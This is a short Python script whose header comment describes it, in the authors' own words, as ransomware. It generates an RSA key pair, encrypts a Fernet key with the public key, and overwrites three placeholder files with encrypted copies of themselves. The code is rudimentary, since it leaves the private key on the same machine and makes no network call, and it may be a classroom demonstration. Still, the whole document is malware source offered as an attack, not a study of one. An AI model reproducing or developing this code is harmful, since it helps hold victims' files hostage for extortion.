# This code creates a public/private key pair, sends the public key to a target, encrypts their targeted files, and holds them for ransom.
# The private key is held by the attacker, and they can decrypt the files if the ransom is paid.
# Authored by John Tiseo and Bryan Sanchez

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

# Generate a public/private key pair
priv_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

pubkey = priv_key.public_key()

# Save the private key
with open("private_key.pem", "wb") as f:
    f.write(priv_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    ))

# Create a symmetric key
smem = Fernet.generate_key()

# Initialize the symmetric key
initsmem = Fernet(smem)

# Encrypt the symmetric key with the public key and write it to a file
with open("symmetric_key", "wb") as f:
    f.write(pubkey.encrypt(
        smem,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))

# Target files to encrypt
targs = ["targ1.txt", "targ2.txt", "targ3.txt"]

# Encrypt the files
for targ in targs:
    with open(targ, "rb") as f:
        data = f.read()
    with open(targ, "wb") as f:
        f.write(initsmem.encrypt(data))
